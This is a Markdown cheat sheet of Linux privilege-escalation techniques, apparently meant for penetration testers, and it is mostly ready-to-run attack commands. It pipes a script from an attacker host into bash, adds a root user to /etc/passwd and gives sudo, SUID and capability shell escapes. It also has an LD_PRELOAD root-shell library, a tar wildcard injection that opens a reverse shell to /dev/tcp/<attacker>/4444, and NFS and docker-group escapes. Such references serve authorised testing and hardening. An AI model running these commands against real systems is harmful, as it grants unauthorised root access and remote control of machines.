# Linux Privilege Escalation

Techniques for elevating privileges on Linux systems.

## Enumeration Scripts

Run these first to automate enumeration:

| Script | Download |
|:-------|:---------|
| **LinPEAS** | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` |
| **LinEnum** | `curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` |
| **linux-exploit-suggester** | `curl -L https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh` |

```bash
# Download and run
curl -L http://<attacker>/linpeas.sh | bash
# or
wget http://<attacker>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

## Quick Wins

### Sudo Rights
```bash
# Check sudo permissions
sudo -l

# Common exploitable entries:
# (ALL) NOPASSWD: /usr/bin/vim
# (ALL) NOPASSWD: /usr/bin/find
# (root) NOPASSWD: /usr/bin/python3
```

**Exploit via GTFOBins**: [gtfobins.github.io](https://gtfobins.github.io/)

### SUID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Look for unusual ones (not standard system binaries)
# Check GTFOBins for exploitation
```

### Writable /etc/passwd
```bash
# Check if writable
ls -la /etc/passwd

# If writable, add new root user
openssl passwd -1 password  # Generate hash
echo 'newroot:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
```

### Writable /etc/shadow
```bash
# Check if readable/writable
ls -la /etc/shadow

# If readable, copy and crack hashes
# If writable, replace root's hash
```

---

## Kernel Exploits

```bash
# Check kernel version
uname -a
cat /etc/os-release

# Search for exploits
searchsploit linux kernel <version>
```

### Notable Kernel Exploits
| CVE | Name | Affected |
|:----|:-----|:---------|
| CVE-2021-4034 | PwnKit | Polkit (most distros) |
| CVE-2021-3156 | Baron Samedit | Sudo 1.8.2-1.8.31p2 |
| CVE-2016-5195 | Dirty COW | Kernel 2.6.22-4.8.3 |
| CVE-2022-0847 | Dirty Pipe | Kernel 5.8+ |

---

## Sudo Exploitation

### GTFOBins Sudo Examples
```bash
# vim
sudo vim -c ':!/bin/bash'

# find
sudo find . -exec /bin/bash \;

# python
sudo python -c 'import os; os.system("/bin/bash")'

# less
sudo less /etc/passwd
!/bin/bash

# nmap (old versions)
sudo nmap --interactive
!bash
```

### LD_PRELOAD
```bash
# If sudo -l shows: env_keep += LD_PRELOAD

# Create malicious library
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

---

## Cron Jobs

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# Look for writable scripts being executed
# Check for wildcard injection opportunities
```

### Wildcard Injection (tar)
```bash
# If cron runs: tar cf /backup.tar *
# In the directory:
echo "bash -i >& /dev/tcp/<attacker>/4444 0>&1" > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

---

## PATH Hijacking

```bash
# If a script runs commands without full path
# And you can modify PATH

# Create malicious binary
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Run the vulnerable script
```

---

## Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Interesting capabilities:
# cap_setuid+ep - can set UID
# cap_net_raw+ep - can sniff traffic
```

### Examples
```bash
# Python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

---

## NFS Root Squashing

```bash
# Check exports
cat /etc/exports
showmount -e <target>

# If no_root_squash is set:
# Mount on attacker, create SUID binary
mount -t nfs <target>:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash
# On target:
/share/bash -p
```

---

## Docker Privilege Escalation

```bash
# Check if user is in docker group
id

# If in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

---

## Quick Checklist

- [ ] Run LinPEAS/LinEnum
- [ ] Check `sudo -l`
- [ ] Find SUID binaries
- [ ] Check kernel version for exploits
- [ ] Check cron jobs
- [ ] Check writable files (passwd, shadow)
- [ ] Check capabilities
- [ ] Check docker/lxc membership
- [ ] Check NFS shares

---

## Resources

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.wiki/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
